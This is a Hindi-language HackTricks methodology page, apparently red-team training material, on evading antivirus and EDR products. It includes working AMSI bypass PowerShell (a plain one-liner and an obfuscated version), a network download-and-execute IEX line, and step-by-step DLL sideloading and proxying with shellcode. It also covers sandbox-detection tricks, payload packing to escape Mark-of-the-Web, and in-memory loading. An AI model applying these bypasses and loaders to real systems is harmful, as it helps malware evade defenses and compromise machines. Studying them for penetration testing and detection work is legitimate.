# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पृष्ठ लिखा गया है** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **AV Evasion Methodology**

वर्तमान में, AV विभिन्न तरीकों का उपयोग करते हैं यह जांचने के लिए कि क्या एक फ़ाइल दुर्भावनापूर्ण है या नहीं, स्थैतिक पहचान, गतिशील विश्लेषण, और अधिक उन्नत EDRs के लिए, व्यवहारात्मक विश्लेषण।

### **Static detection**

स्थैतिक पहचान ज्ञात दुर्भावनापूर्ण स्ट्रिंग्स या बाइट्स के एरे को एक बाइनरी या स्क्रिप्ट में फ्लैग करके प्राप्त की जाती है, और फ़ाइल से जानकारी निकालने के लिए (जैसे फ़ाइल विवरण, कंपनी का नाम, डिजिटल हस्ताक्षर, आइकन, चेकसम, आदि)। इसका मतलब है कि ज्ञात सार्वजनिक उपकरणों का उपयोग करने से आपको अधिक आसानी से पकड़ा जा सकता है, क्योंकि उन्हें शायद विश्लेषित किया गया है और दुर्भावनापूर्ण के रूप में फ्लैग किया गया है। इस प्रकार की पहचान को बायपास करने के कुछ तरीके हैं:

- **Encryption**

यदि आप बाइनरी को एन्क्रिप्ट करते हैं, तो AV के लिए आपके प्रोग्राम का पता लगाने का कोई तरीका नहीं होगा, लेकिन आपको प्रोग्राम को मेमोरी में डिक्रिप्ट और चलाने के लिए किसी प्रकार के लोडर की आवश्यकता होगी।

- **Obfuscation**

कभी-कभी आपको बस अपने बाइनरी या स्क्रिप्ट में कुछ स्ट्रिंग्स को बदलने की आवश्यकता होती है ताकि यह AV को पार कर सके, लेकिन यह उस पर निर्भर करता है कि आप क्या ओबफस्केट करने की कोशिश कर रहे हैं, यह एक समय लेने वाला कार्य हो सकता है।

- **Custom tooling**

यदि आप अपने स्वयं के उपकरण विकसित करते हैं, तो कोई ज्ञात बुरा हस्ताक्षर नहीं होगा, लेकिन इसके लिए बहुत समय और प्रयास की आवश्यकता होती है।

> [!NOTE]
> Windows Defender की स्थैतिक पहचान के खिलाफ जांचने का एक अच्छा तरीका है [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)। यह मूल रूप से फ़ाइल को कई खंडों में विभाजित करता है और फिर Defender को प्रत्येक को व्यक्तिगत रूप से स्कैन करने के लिए कहता है, इस तरह, यह आपको सटीक रूप से बता सकता है कि आपके बाइनरी में कौन सी फ्लैग की गई स्ट्रिंग्स या बाइट्स हैं।

मैं अत्यधिक अनुशंसा करता हूँ कि आप इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को व्यावहारिक AV Evasion के बारे में देखें।

### **Dynamic analysis**

गतिशील विश्लेषण तब होता है जब AV आपके बाइनरी को एक सैंडबॉक्स में चलाता है और दुर्भावनापूर्ण गतिविधियों पर नज़र रखता है (जैसे आपके ब्राउज़र के पासवर्ड को डिक्रिप्ट और पढ़ने की कोशिश करना, LSASS पर मिनीडंप करना, आदि)। इस भाग के साथ काम करना थोड़ा कठिन हो सकता है, लेकिन यहाँ कुछ चीजें हैं जो आप सैंडबॉक्स को बायपास करने के लिए कर सकते हैं।

- **Sleep before execution** इसे लागू करने के तरीके के आधार पर, यह AV के गतिशील विश्लेषण को बायपास करने का एक शानदार तरीका हो सकता है। AV के पास फ़ाइलों को स्कैन करने के लिए बहुत कम समय होता है ताकि उपयोगकर्ता के कार्यप्रवाह में बाधा न आए, इसलिए लंबे स्लीप का उपयोग बाइनरी के विश्लेषण को बाधित कर सकता है। समस्या यह है कि कई AV के सैंडबॉक्स स्लीप को छोड़ सकते हैं, यह इस बात पर निर्भर करता है कि इसे कैसे लागू किया गया है।
- **Checking machine's resources** आमतौर पर सैंडबॉक्स के पास काम करने के लिए बहुत कम संसाधन होते हैं (जैसे < 2GB RAM), अन्यथा वे उपयोगकर्ता की मशीन को धीमा कर सकते हैं। आप यहाँ बहुत रचनात्मक भी हो सकते हैं, उदाहरण के लिए CPU के तापमान या यहां तक कि फैन स्पीड की जांच करके, सब कुछ सैंडबॉक्स में लागू नहीं होगा।
- **Machine-specific checks** यदि आप एक उपयोगकर्ता को लक्षित करना चाहते हैं जिसकी कार्यस्थल "contoso.local" डोमेन से जुड़ी है, तो आप कंप्यूटर के डोमेन पर जांच कर सकते हैं कि क्या यह उस डोमेन से मेल खाता है जिसे आपने निर्दिष्ट किया है, यदि नहीं, तो आप अपने प्रोग्राम को बाहर निकलने के लिए कह सकते हैं।

यह पता चला है कि Microsoft Defender का सैंडबॉक्स कंप्यूटर नाम HAL9TH है, इसलिए, आप अपने मैलवेयर में विस्फोट से पहले कंप्यूटर नाम की जांच कर सकते हैं, यदि नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप Defender के सैंडबॉक्स के अंदर हैं, इसलिए आप अपने प्रोग्राम को बाहर निकलने के लिए कह सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit) से सैंडबॉक्स के खिलाफ जाने के लिए कुछ अन्य बहुत अच्छे टिप्स

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev चैनल</p></figcaption></figure>

जैसा कि हमने इस पोस्ट में पहले कहा है, **सार्वजनिक उपकरण** अंततः **पकड़े जाएंगे**, इसलिए, आपको अपने आप से कुछ पूछना चाहिए:

उदाहरण के लिए, यदि आप LSASS को डंप करना चाहते हैं, **क्या आपको वास्तव में mimikatz का उपयोग करने की आवश्यकता है**? या क्या आप एक अलग प्रोजेक्ट का उपयोग कर सकते हैं जो कम ज्ञात है और LSASS को भी डंप करता है।

सही उत्तर शायद बाद वाला है। mimikatz को एक उदाहरण के रूप में लेते हुए, यह शायद AVs और EDRs द्वारा सबसे अधिक फ्लैग की गई मैलवेयर में से एक है, जबकि प्रोजेक्ट स्वयं सुपर कूल है, इसके साथ AVs को बायपास करने के लिए काम करना एक बुरा सपना है, इसलिए आप जो हासिल करने की कोशिश कर रहे हैं उसके लिए विकल्पों की तलाश करें।

> [!NOTE]
> जब आप अपने पेलोड को बायपास के लिए संशोधित करते हैं, तो सुनिश्चित करें कि **डिफेंडर में स्वचालित नमूना सबमिशन बंद करें**, और कृपया, गंभीरता से, **VIRUSTOTAL पर अपलोड न करें** यदि आपका लक्ष्य लंबे समय में बायपास प्राप्त करना है। यदि आप यह जांचना चाहते हैं कि क्या आपका पेलोड किसी विशेष AV द्वारा पकड़ा गया है, तो इसे एक VM पर इंस्टॉल करें, स्वचालित नमूना सबमिशन बंद करने की कोशिश करें, और वहां परीक्षण करें जब तक कि आप परिणाम से संतुष्ट न हों।

## EXEs vs DLLs

जब भी संभव हो, हमेशा **बायपास के लिए DLLs का उपयोग करने को प्राथमिकता दें**, मेरे अनुभव में, DLL फ़ाइलें आमतौर पर **बहुत कम पहचानी जाती हैं** और विश्लेषित की जाती हैं, इसलिए कुछ मामलों में पहचान से बचने के लिए इसका उपयोग करना एक बहुत सरल ट्रिक है (यदि आपके पेलोड में किसी तरह से DLL के रूप में चलने का तरीका है)।

जैसा कि हम इस छवि में देख सकते हैं, Havoc का एक DLL पेलोड antiscan.me पर 4/26 की पहचान दर है, जबकि EXE पेलोड की पहचान दर 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me पर सामान्य Havoc EXE पेलोड बनाम सामान्य Havoc DLL की तुलना</p></figcaption></figure>

अब हम कुछ ट्रिक्स दिखाएंगे जिन्हें आप DLL फ़ाइलों के साथ उपयोग कर सकते हैं ताकि अधिक छिपे हुए रह सकें।

## DLL Sideloading & Proxying

**DLL Sideloading** लोडर द्वारा उपयोग की जाने वाली DLL खोज क्रम का लाभ उठाता है, जिसमें पीड़ित एप्लिकेशन और दुर्भावनापूर्ण पेलोड को एक साथ रखा जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और निम्नलिखित पॉवरशेल स्क्रिप्ट का उपयोग करके DLL Sideloading के प्रति संवेदनशील कार्यक्रमों की जांच कर सकते हैं:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
यह कमांड "C:\Program Files\\" के अंदर DLL हाइजैकिंग के प्रति संवेदनशील प्रोग्रामों की सूची और वे DLL फ़ाइलें जो वे लोड करने की कोशिश करते हैं, आउटपुट करेगा।

मैं अत्यधिक अनुशंसा करता हूँ कि आप **DLL हाइजैक करने योग्य/साइडलोड करने योग्य प्रोग्रामों का स्वयं अन्वेषण करें**, यह तकनीक सही तरीके से की गई तो काफी छिपी हुई होती है, लेकिन यदि आप सार्वजनिक रूप से ज्ञात DLL साइडलोड करने योग्य प्रोग्रामों का उपयोग करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

बस एक दुर्भावनापूर्ण DLL को उस नाम के साथ रखने से जो एक प्रोग्राम लोड करने की अपेक्षा करता है, आपका पेलोड लोड नहीं होगा, क्योंकि प्रोग्राम उस DLL के अंदर कुछ विशिष्ट कार्यों की अपेक्षा करता है, इस समस्या को ठीक करने के लिए, हम एक और तकनीक का उपयोग करेंगे जिसे **DLL प्रॉक्सींग/फॉरवर्डिंग** कहा जाता है।

**DLL प्रॉक्सींग** प्रोग्राम द्वारा प्रॉक्सी (और दुर्भावनापूर्ण) DLL से मूल DLL को किए गए कॉल को आगे बढ़ाता है, इस प्रकार प्रोग्राम की कार्यक्षमता को बनाए रखते हुए आपके पेलोड के निष्पादन को संभालने में सक्षम होता है।

मैं [@flangvik](https://twitter.com/Flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग करने जा रहा हूँ।

ये वे चरण हैं जिनका मैंने पालन किया:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
अंतिम कमांड हमें 2 फ़ाइलें देगी: एक DLL स्रोत कोड टेम्पलेट, और मूल नामित DLL। 

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे दोनों शेलकोड (जो [SGN](https://github.com/EgeBalci/sgn) के साथ एन्कोडेड है) और प्रॉक्सी DLL का [antiscan.me](https://antiscan.me) में 0/26 डिटेक्शन दर है! मैं इसे एक सफलता कहूंगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> मैं **गंभीरता से सुझाव देता हूँ** कि आप [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) को DLL Sideloading के बारे में देखें और साथ ही [ippsec का वीडियो](https://www.youtube.com/watch?v=3eROsG_WNpE) देखें ताकि आप जो हमने गहराई से चर्चा की है, उसके बारे में और अधिक जान सकें।

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze एक पेलोड टूलकिट है जो निलंबित प्रक्रियाओं, सीधे syscalls, और वैकल्पिक निष्पादन विधियों का उपयोग करके EDRs को बायपास करने के लिए है`

आप Freeze का उपयोग अपने शेलकोड को छिपे हुए तरीके से लोड और निष्पादित करने के लिए कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> बचाव केवल एक बिल्ली और चूहा खेल है, जो आज काम करता है वह कल पता लगाया जा सकता है, इसलिए कभी भी केवल एक उपकरण पर निर्भर न रहें, यदि संभव हो तो कई बचाव तकनीकों को जोड़ने की कोशिश करें।

## AMSI (एंटी-मैलवेयर स्कैन इंटरफेस)

AMSI को "[फाइललेस मैलवेयर](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। प्रारंभ में, AV केवल **डिस्क पर फ़ाइलों** को स्कैन करने में सक्षम थे, इसलिए यदि आप किसी तरह **प्रत्यक्ष रूप से मेमोरी में** पेलोड निष्पादित कर सकते थे, तो AV इसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि इसके पास पर्याप्त दृश्यता नहीं थी।

AMSI सुविधा Windows के इन घटकों में एकीकृत है।

- उपयोगकर्ता खाता नियंत्रण, या UAC (EXE, COM, MSI, या ActiveX स्थापना का उन्नयन)
- PowerShell (स्क्रिप्ट, इंटरैक्टिव उपयोग, और गतिशील कोड मूल्यांकन)
- Windows स्क्रिप्ट होस्ट (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA मैक्रोज़

यह एंटीवायरस समाधानों को स्क्रिप्ट व्यवहार की जांच करने की अनुमति देता है, स्क्रिप्ट सामग्री को एक रूप में उजागर करके जो न तो एन्क्रिप्टेड है और न ही अस्पष्ट।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender पर निम्नलिखित अलर्ट उत्पन्न होगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को पहले जोड़ता है और फिर उस निष्पादन योग्य का पथ जोड़ता है जिससे स्क्रिप्ट चलाई गई, इस मामले में, powershell.exe

हमने डिस्क पर कोई फ़ाइल नहीं गिराई, लेकिन फिर भी AMSI के कारण मेमोरी में पकड़े गए।

AMSI को बायपास करने के कुछ तरीके हैं:

- **अस्पष्टता**

चूंकि AMSI मुख्य रूप से स्थिर पहचान के साथ काम करता है, इसलिए, आप जो स्क्रिप्ट लोड करने की कोशिश कर रहे हैं, उन्हें संशोधित करना पहचान से बचने का एक अच्छा तरीका हो सकता है।

हालांकि, AMSI के पास स्क्रिप्ट को अस्पष्ट करने की क्षमता है, भले ही इसमें कई परतें हों, इसलिए अस्पष्टता एक बुरा विकल्प हो सकता है, यह इस बात पर निर्भर करता है कि इसे कैसे किया गया है। यह इसे बचने के लिए इतना सीधा नहीं बनाता। हालांकि, कभी-कभी, आपको केवल कुछ चर के नाम बदलने की आवश्यकता होती है और आप ठीक हो जाएंगे, इसलिए यह इस बात पर निर्भर करता है कि कुछ कितना फ्लैग किया गया है।

- **AMSI बायपास**

चूंकि AMSI को powershell (साथ ही cscript.exe, wscript.exe, आदि) प्रक्रिया में एक DLL लोड करके लागू किया गया है, इसलिए इसे आसानी से छेड़छाड़ करना संभव है, भले ही एक अप्रिविलेज्ड उपयोगकर्ता के रूप में चलाया जाए। AMSI के कार्यान्वयन में इस दोष के कारण, शोधकर्ताओं ने AMSI स्कैनिंग से बचने के कई तरीके खोजे हैं।

**एक त्रुटि को मजबूर करना**

AMSI प्रारंभिककरण को विफल (amsiInitFailed) करने के लिए मजबूर करने से वर्तमान प्रक्रिया के लिए कोई स्कैन शुरू नहीं होगा। मूल रूप से, इसे [Matt Graeber](https://twitter.com/mattifestation) द्वारा प्रकट किया गया था और Microsoft ने व्यापक उपयोग को रोकने के लिए एक हस्ताक्षर विकसित किया है।
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
बस एक पंक्ति का powershell कोड AMSI को वर्तमान powershell प्रक्रिया के लिए अनुपयोगी बनाने के लिए आवश्यक था। इस पंक्ति को निश्चित रूप से AMSI द्वारा चिह्नित किया गया है, इसलिए इस तकनीक का उपयोग करने के लिए कुछ संशोधन की आवश्यकता है।

यहां एक संशोधित AMSI बायपास है जो मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें, कि यह संभवतः इस पोस्ट के प्रकाशित होने पर फ्लैग किया जाएगा, इसलिए यदि आपकी योजना अदृश्य रहने की है तो आपको कोई कोड प्रकाशित नहीं करना चाहिए।

**Memory Patching**

यह तकनीक मूल रूप से [@RastaMouse](https://twitter.com/_RastaMouse/) द्वारा खोजी गई थी और इसमें amsi.dll में "AmsiScanBuffer" फ़ंक्शन के लिए पता लगाना शामिल है (जो उपयोगकर्ता द्वारा प्रदान किए गए इनपुट को स्कैन करने के लिए जिम्मेदार है) और इसे E_INVALIDARG के लिए कोड लौटाने के लिए निर्देशों के साथ ओवरराइट करना शामिल है, इस तरह, वास्तविक स्कैन का परिणाम 0 लौटेगा, जिसे एक साफ परिणाम के रूप में व्याख्यायित किया जाता है।

> [!NOTE]
> कृपया अधिक विस्तृत व्याख्या के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

AMSI को बायपास करने के लिए PowerShell के साथ कई अन्य तकनीकें भी हैं, उनके बारे में अधिक जानने के लिए [**इस पृष्ठ**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [इस रेपो](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) पर जाएं।

या यह स्क्रिप्ट जो मेमोरी पैचिंग के माध्यम से प्रत्येक नए PowerShell को पैच करेगी।

## Obfuscation

कई उपकरण हैं जो **C# स्पष्ट-टेक्स्ट कोड को ओबफस्केट** करने, बाइनरी को संकलित करने के लिए **मेटाप्रोग्रामिंग टेम्पलेट** उत्पन्न करने या **संकलित बाइनरी को ओबफस्केट** करने के लिए उपयोग किए जा सकते हैं जैसे:

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# ओबफस्केटर**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस परियोजना का उद्देश्य [LLVM](http://www.llvm.org/) संकलन सूट का एक ओपन-सोर्स फोर्क प्रदान करना है जो [कोड ओबफस्केशन](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) और टेम्पर-प्रूफिंग के माध्यम से सॉफ़्टवेयर सुरक्षा बढ़ा सके।
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator यह प्रदर्शित करता है कि `C++11/14` भाषा का उपयोग करके, संकलन के समय ओबफस्केटेड कोड कैसे उत्पन्न किया जाए बिना किसी बाहरी उपकरण का उपयोग किए और बिना संकलक को संशोधित किए।
- [**obfy**](https://github.com/fritzone/obfy): C++ टेम्पलेट मेटाप्रोग्रामिंग ढांचे द्वारा उत्पन्न ओबफस्केटेड ऑपरेशनों की एक परत जोड़ें जो एप्लिकेशन को क्रैक करने की कोशिश कर रहे व्यक्ति के लिए जीवन को थोड़ा कठिन बना देगी।
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 बाइनरी ओबफस्केटर है जो विभिन्न प्रकार की pe फ़ाइलों को ओबफस्केट करने में सक्षम है, जिसमें: .exe, .dll, .sys शामिल हैं।
- [**metame**](https://github.com/a0rtega/metame): Metame एक साधारण मेटामॉर्फिक कोड इंजन है जो मनमाने निष्पादन योग्य के लिए है।
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक बारीक-ग्रेन कोड ओबफस्केशन ढांचा है जो ROP (रिटर्न-ओरिएंटेड प्रोग्रामिंग) का उपयोग करता है। ROPfuscator एक कार्यक्रम को असेंबली कोड स्तर पर ओबफस्केट करता है, नियमित निर्देशों को ROP श्रृंखलाओं में परिवर्तित करके, हमारे सामान्य नियंत्रण प्रवाह की धारणा को बाधित करता है।
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt एक .NET PE क्रिप्टर है जो Nim में लिखा गया है।
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को शेलकोड में परिवर्तित करने और फिर उन्हें लोड करने में सक्षम है।

## SmartScreen & MoTW

आपने इंटरनेट से कुछ निष्पादन योग्य फ़ाइलें डाउनलोड करते समय और उन्हें निष्पादित करते समय यह स्क्रीन देखी होगी।

Microsoft Defender SmartScreen एक सुरक्षा तंत्र है जिसका उद्देश्य अंतिम उपयोगकर्ता को संभावित रूप से दुर्भावनापूर्ण अनुप्रयोगों को चलाने से बचाना है।

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से एक प्रतिष्ठा-आधारित दृष्टिकोण के साथ काम करता है, जिसका अर्थ है कि असामान्य रूप से डाउनलोड की गई अनुप्रयोग SmartScreen को ट्रिगर करेगी, इस प्रकार अंतिम उपयोगकर्ता को फ़ाइल निष्पादित करने से रोक देगी (हालांकि फ़ाइल को अभी भी More Info -> Run anyway पर क्लिक करके निष्पादित किया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है जिसका नाम Zone.Identifier है, जो इंटरनेट से फ़ाइलें डाउनलोड करते समय स्वचालित रूप से बनाया जाता है, साथ ही उस URL के साथ जिससे इसे डाउनलोड किया गया था।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फ़ाइल के लिए Zone.Identifier ADS की जांच करना।</p></figcaption></figure>

> [!NOTE]
> यह ध्यान रखना महत्वपूर्ण है कि **विश्वसनीय** साइनिंग सर्टिफिकेट के साथ साइन की गई निष्पादन योग्य फ़ाइलें **SmartScreen को ट्रिगर नहीं करेंगी**।

आपके पेलोड को Mark of The Web से बचाने का एक बहुत प्रभावी तरीका उन्हें किसी प्रकार के कंटेनर जैसे ISO के अंदर पैकेज करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **non NTFS** वॉल्यूम पर लागू **नहीं** किया जा सकता है।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक उपकरण है जो पेलोड को आउटपुट कंटेनरों में पैकेज करता है ताकि Mark-of-the-Web से बचा जा सके।

उदाहरण उपयोग:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

C# बाइनरीज़ को मेमोरी में लोड करना काफी समय से जाना जाता है और यह अभी भी आपके पोस्ट-एक्सप्लॉइटेशन टूल्स को AV द्वारा पकड़े जाने के बिना चलाने का एक बहुत अच्छा तरीका है।

चूंकि पेलोड सीधे मेमोरी में लोड होगा बिना डिस्क को छुए, हमें पूरे प्रक्रिया के लिए केवल AMSI को पैच करने की चिंता करनी होगी।

अधिकांश C2 फ्रेमवर्क (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही मेमोरी में सीधे C# असेंबली को निष्पादित करने की क्षमता प्रदान करते हैं, लेकिन ऐसा करने के विभिन्न तरीके हैं:

- **Fork\&Run**

इसमें **एक नया बलिदान प्रक्रिया उत्पन्न करना** शामिल है, अपने पोस्ट-एक्सप्लॉइटेशन दुर्भावनापूर्ण कोड को उस नए प्रक्रिया में इंजेक्ट करना, अपने दुर्भावनापूर्ण कोड को निष्पादित करना और जब समाप्त हो जाए, तो नए प्रक्रिया को मार देना। इसके अपने लाभ और हानि हैं। फोर्क और रन विधि का लाभ यह है कि निष्पादन हमारे बीकन इम्प्लांट प्रक्रिया के **बाहर** होता है। इसका मतलब है कि यदि हमारे पोस्ट-एक्सप्लॉइटेशन क्रिया में कुछ गलत हो जाता है या पकड़ा जाता है, तो हमारे **इम्प्लांट के जीवित रहने की संभावना** **बहुत अधिक है।** हानि यह है कि आपको **व्यवहारात्मक पहचान** द्वारा पकड़े जाने की **अधिक संभावना** है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने पोस्ट-एक्सप्लॉइटेशन दुर्भावनापूर्ण कोड को **अपने ही प्रक्रिया में इंजेक्ट करने** के बारे में है। इस तरह, आप एक नया प्रक्रिया बनाने और उसे AV द्वारा स्कैन कराने से बच सकते हैं, लेकिन हानि यह है कि यदि आपके पेलोड के निष्पादन में कुछ गलत हो जाता है, तो आपके **बीकन को खोने की संभावना** **बहुत अधिक है** क्योंकि यह क्रैश हो सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> यदि आप C# असेंबली लोडिंग के बारे में अधिक पढ़ना चाहते हैं, तो कृपया इस लेख को देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनके InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

आप C# असेंबली को **PowerShell से भी लोड कर सकते हैं**, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t का वीडियो](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## Using Other Programming Languages

जैसा कि [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित किया गया है, यह अन्य भाषाओं का उपयोग करके दुर्भावनापूर्ण कोड निष्पादित करना संभव है, जिससे समझौता की गई मशीन को **हमलावर द्वारा नियंत्रित SMB शेयर पर स्थापित इंटरप्रेटर वातावरण तक पहुंच** मिलती है।

इंटरप्रेटर बाइनरीज़ और SMB शेयर पर वातावरण तक पहुंच प्रदान करके आप **समझौता की गई मशीन की मेमोरी में इन भाषाओं में मनमाना कोड निष्पादित कर सकते हैं।**

रेपो इंगित करता है: डिफेंडर अभी भी स्क्रिप्ट को स्कैन करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **स्थिर हस्ताक्षरों को बायपास करने के लिए अधिक लचीलापन है।** इन भाषाओं में यादृच्छिक अन-ऑबफस्केटेड रिवर्स शेल स्क्रिप्ट के साथ परीक्षण सफल साबित हुआ है।

## Advanced Evasion

एवेज़न एक बहुत जटिल विषय है, कभी-कभी आपको एक ही सिस्टम में कई विभिन्न टेलीमेट्री स्रोतों पर विचार करना पड़ता है, इसलिए परिपक्व वातावरण में पूरी तरह से अदृश्य रहना लगभग असंभव है।

आप जिस भी वातावरण के खिलाफ जाते हैं, उसके अपने ताकत और कमजोरियाँ होंगी।

मैं आपको [@ATTL4S](https://twitter.com/DaniLJ94) से इस टॉक को देखने की सिफारिश करता हूँ, ताकि आप अधिक उन्नत एवेज़न तकनीकों में एक पैर रख सकें।

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह [@mariuszbit](https://twitter.com/mariuszbit) से एवेज़न इन डेप्थ के बारे में एक और शानदार टॉक है।

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो **बाइनरी के हिस्सों को हटा देगा** जब तक कि यह **नहीं पता चलता कि डिफेंडर** किस हिस्से को दुर्भावनापूर्ण मानता है और इसे आपके लिए विभाजित कर देगा।\
एक और टूल जो **समान कार्य करता है वह है** [**avred**](https://github.com/dobin/avred) जिसमें [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) पर सेवा प्रदान की जाती है।

### **Telnet Server**

